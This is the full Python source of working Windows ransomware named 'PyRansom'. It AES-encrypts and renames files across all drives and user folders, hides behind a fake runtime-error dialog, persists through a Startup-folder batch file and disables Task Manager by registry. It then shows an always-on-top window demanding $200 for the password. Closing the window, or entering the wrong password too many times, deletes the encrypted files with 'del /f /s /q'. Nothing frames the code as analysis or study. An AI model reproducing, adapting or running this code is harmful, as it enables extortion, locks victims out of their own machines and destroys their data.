import os,sys
import base64
import random
import tkinter as tk
import getpass
import time
from Crypto.Cipher import AES
from tkinter import messagebox as me
key = b'1145141919810pythonhnmpythonbest'
ID = random.randint(100000,1000000)
user = getpass.getuser()
sDAHAdEAF = open(r'C:/PyRansom.bat','w')
sDAHAdEAF.write('@echo off\r\ncopy '+sys.executable+' C:\PyRansom.exe\r\nexit')
sDAHAdEAF.close()
def en(file):
    global key
    filef = open(file,'rb+')
    plaintext = filef.read()# 明文
    filef.close()
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    wn = open('decrypt.dky','wb+')
    wn.write(nonce)
    wn.close()
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    filef = open(file,'wb+')
    filef.write(ciphertext)
    filef.close()
# 解密方
def de(file,ID_file):
    global key
    noncef = open(ID_file,'rb+')
    nonce = noncef.read()
    noncef.close()
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    ciphertextt = open(file,'rb+')
    ciphertext = ciphertextt.read()
    ciphertextt.close()
    plaintext = cipher.decrypt(ciphertext)
    #cipher.verify(tag)  # 验证真实性
    filef = open(file,'wb+')
    filef.write(plaintext)
    filef.close()
    os.remove(ID_file)
try:
    checkc = open(f'C:/Users/{user}/Documents/change.txt','r')
    change = int(checkc.read())
    checkc.close()
except:
    change = 5
try:
    copy = open(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/PyRansom.bat','w')
    copy.write('@echo off\r\nstart C:\PyRansom.exe')
    copy.close()
except:
    pass
def jing():
    global user
    try:
        filess = open(f'C:/Users/{user}/Documents/tkmgr.reg','w')
        filess.write('Windows Registry Editor Version 5.00\r\n[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]\r\n"DisableTaskMgr"=dword:02')
        filess.close()
        os.popen(f'start /B regedit /S C:/Users/{user}/Documents/tkmgr.reg')
    except:
        pass
def huan():
    global user
    try:
        filed = open(f'C:/Users/{user}/Documents/tkmgr.reg','w')
        filed.write('Windows Registry Editor Version 5.00\r\n[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]\r\n"DisableTaskMgr"=dword:00')
        filed.close()
        os.popen(f'start /B regedit /S C:/Users/{user}/Documents/tkmgr.reg')
    except:
        pass
jing()
me.showerror("Microsoft Visual C++ Runtime Error","Runtime error!")
mulu = ['C:/','D:/','E:/','F:/','G:/','H:/',f'C:/Users/{user}/desktop/',f'C:/Users/{user}/',f'C:/Users/']
def lib(mulu):
    def path(path):
        try:
            for file in os.listdir(mulu+path+r"/."):
                if '.' in os.path.splitext(file)[1]:
                    try:
                        en(mulu+path+r'/'+file)
                        os.rename(mulu+path+r'/'+file,mulu+path+r'/'+file+r".pyransom")
                    except:
                        os.rename(mulu+path+r'/'+file,mulu+path+r'/'+file+r".pyransom")
                        pass
                else:
                    pass
        except:
            pass
    try:
        for file in os.listdir(mulu+r"."):
            try:
                if '.' in os.path.splitext(file)[1]:
                    try:
                        en(mulu+file)
                        os.rename(mulu+file,mulu+file+".pyransom")
                    except:
                        os.rename(mulu+file,mulu+file+".pyransom")
                        pass
                else:
                    path(file)
                    pass
            except:
                pass
    except:
        pass
def delib(mulu,ID_file):
    def path(path):
        try:
            for file in os.listdir(mulu+path+r"/."):
                if '.' in os.path.splitext(file)[1]:
                    try:
                        de(mulu+path+r'/'+file,ID_file)
                    except:
                        pass
                else:
                    pass
        except:
            pass
    try:
        for file in os.listdir(mulu+r"."):
            try:
                if '.' in os.path.splitext(file)[1]:
                    try:
                        de(mulu+file,ID_file)
                    except:
                        pass
                else:
                    path(file)
                    pass
            except:
                pass
    except:
        pass
for i in mulu:
    lib(i)
for hhhh in range(1,101):
    try:
        oooo = open(f'C:/Users/{user}/desktop/{hhhh}.id[{ID}].icanrestore[pythonhavenoname@163.com].pyransom','w')
        oooo.write('All you file have been encrypt!\r\nPlaese see the decrypt window.')
        oooo.close()
    except:
        pass
os.system('C:/PyRansom.bat')
def close():
    global mulu
    global user
    print('You cant leave!')
    try:
        os.remove(f'C:/Users/{user}/Documents/change.txt')
    except:
        pass
    for deldel in mulu:
        os.system(f'del /f /s /q {deldel}*.pyransom')
    exit(0)
    return False
temp = open("icon.gif","wb+")
tempb64=base64.b64decode(r'R0lGODlhQABAAPAAAAAAAAAAACH5BAEAAAAAIf8LSW1hZ2VNYWdpY2sOZ2FtbWE9MC40NTQ1NDUAIf8LWE1QIERhdGFYTVA8P3hwYWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBtZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJyB4OnhtcHRrPSdJbWFnZTo6RXhpZlRvb2wgMTIuNDAnPgo8cmRmOlJERiB4bWxuczpyZGY9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMnPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6dGlmZj0naHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8nPgogIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiA8L3JkZjpEZXNjcmlwdGlvbj4KPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0ndyc/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACwAAAAAQABAAAAC6YSPqavhD5mctBqIs9085a914gSW0Ygi5uqkKQu7IkzLW13blCnxeg+ylH6M4O1DbBiFyKSqyVk6pcyQEwDtZInUI+aK3Xq/U3GVnOyeT2lzRS2D79wuOYkOzuv3NpqfrfMnaDc3aGgVdaiINraoqOUYGZAouUhZeXiJOai5+dfpmbMWKvpGKgjq9/TY+KlkmMoCxNla6gFbG1OEO2q7iporu0vbq/tKbMr7C1xsaxlsfMHaHB2WCS188EydLX3NvXL7naxsXX437Rh7SrjMHo79DlgoDw9ePxmPD4nfftz/4AXAgHUGIigAADs=')
temp.write(tempb64)
temp.close()
password = str((ID+3)*2)
print("Password:"+password+"    ID:"+str(ID))
root = tk.Tk()
def get():
    global change
    global user
    global mulu
    if change != 0:
        if entry.get() == password:
            for defile in mulu:
                delib(defile,'decrypt.dky')
            for enen in mulu:
                os.system(f'ren {enen}*.pyransom {enen}*.')
            os.remove(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/PyRansom.bat')
            os.remove('C:/PyRansom.bat')
            os.remove(f'C:/Users/{user}/Documents/tkmgr.reg')
            os.remove(f'C:/Users/{user}/Documents/change.txt')
            huan()
            time.sleep(2)
            root.destroy()
        else:
            change = change-1
            wrtc = open(f'C:/Users/{user}/Documents/change.txt','w')
            wrtc.write(change)
            wrtc.close()
    else:
        try:
            os.remove(f'C:/Users/{user}/Documents/change.txt')
        except:
            pass
        for deldel in mulu:
            os.system(f'del /f /s /q {deldel}*.pyransom')
        exit(0)
root.config(background = "red")
photo = tk.PhotoImage(file="icon.gif")
icon = tk.Label(root,image=photo)
icon.pack()
os.remove("icon.gif")
width = 900
height = 500
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth-width)/2, (screenheight-height)/2)
root.geometry(alignstr)
root.resizable(width=False,height=False)
root.wm_attributes('-topmost',1)
first = tk.Label(root,text="All your file have been encrypt!",bg="red")
first.config(font=("Arial",20))
first.pack()
a = tk.Label(root,text="All your files have been encrypted due to a security problem with your PC. If you want to restore them, ",bg="red")
a.config(font=("Arial",15))
a.pack()
c = tk.Label(root,text="write us to the e-mail:pythonhavenoname@163.com",bg="red")
c.config(font=("Arial",15))
c.pack()
b = tk.Label(root,text="Write This ID in the title of your message:"+str(ID),bg="red")
b.config(font=("Arial",15))
b.pack()
d = tk.Label(root,text="You should pay 200$ to us.",bg="red")
d.config(font=("Arial",15))
d.pack()
e = tk.Label(root,text="If you pay,we will send you decrypt password.",bg="red")
e.config(font=("Arial",15))
e.pack()
cv = tk.Label(root,text="And,if you shut down your PC or try decrypt you file,all you data will never cant restore!",bg="red")
cv.config(font=("Arial",15))
cv.pack()
try:
    checkc = open(f'C:/Users/{user}/Documents/change.txt','r')
    change = int(checkc.read())
    checkc.close()
    dddh = tk.Label(root,text="(Oh,you restart your PC!)",bg="red")
    dddh.config(font=("Arial",15))
    dddh.pack()
except:
    pass
zh = tk.Label(root,text="Finally,don't remove or move 'decrypt.dky'! Because it's your decrypt key!",bg="red")
zh.config(font=("Arial",15))
zh.pack()
zht = tk.Label(root,text="if your remove it,all you data will never cant restore!(decryptor will error exit!)",bg="red")
zht.config(font=("Arial",15))
zht.pack()
f = tk.Label(root,text="Remember,you only have "+str(change)+" change.",bg="red")
f.config(font=("Arial",15))
f.pack()
info = tk.Label(root,text="Come on! Input Password:",bg="red")
info.config(font=("Arial",15))
info.pack()
entry = tk.Entry(root,width=100)
entry.pack()
ok = tk.Button(root,text="Now Decrypt",command=get)
ok.pack(side="bottom")
root.protocol("WM_DELETE_WINDOW",close)
root.overrideredirect(True)
root.mainloop()
